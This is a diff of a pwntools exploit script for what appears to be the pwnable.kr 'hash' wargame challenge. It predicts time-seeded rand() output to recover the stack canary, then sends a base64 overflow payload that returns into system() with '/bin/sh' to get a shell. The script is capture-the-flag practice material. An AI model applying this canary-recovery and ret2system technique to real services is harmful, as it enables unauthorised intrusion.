@@ -1,28 +1,25 @@
-#/usr/bin/python
 from pwn import *
 import base64
 from ctypes import *
 from ctypes.util import find_library 
+context.log_level = 'debug'
 
-#libc = cdll.Loadlibrary(find_library('c'))
 libc = CDLL(find_library('c'))
 libc.srand(libc.time(0))
 array = [ libc.rand() for i in range(8)]
 
-context.log_level = 'debug'
-
-r = remote('pwnable.kr', 9002)
+n = remote('pwnable.kr', 9002)
 
 system_plt = 0x8048880
 g_bufs = 0x804b0e0 + 0x2d0
 
-r.recvuntil('captcha : ')
-recv = int(r.recvline()[:-1])
-r.sendline(str(recv))
+n.recvuntil('captcha : ')
+recv = int(n.recvline()[:-1])
+n.sendline(str(recv))
 canary = (recv - array[4] + array[6] - array[7] - array[2] + array[3] - array[1] - array[5]) & 0xffffffff;
 success('canary = '+hex(canary))
 
-r.recvuntil('Encode your data with BASE64 then paste me!\n')
+n.recvuntil('Encode your data with BASE64 then paste me!\n')
 
 payload = b'A'*(0x200)
 payload += p32(canary)
@@ -31,9 +28,9 @@ payload += p32(system_plt)
 payload += b'BBBB'
 payload += p32(g_bufs)
 
-r.sendline(base64.encodestring(payload).replace(b'\n', b'')+b'/bin/sh'+b'\x00')
+n.sendline(base64.encodestring(payload).replace(b'\n', b'')+b'/bin/sh'+b'\x00')
 
 
-r.interactive()
+n.interactive()
 
 
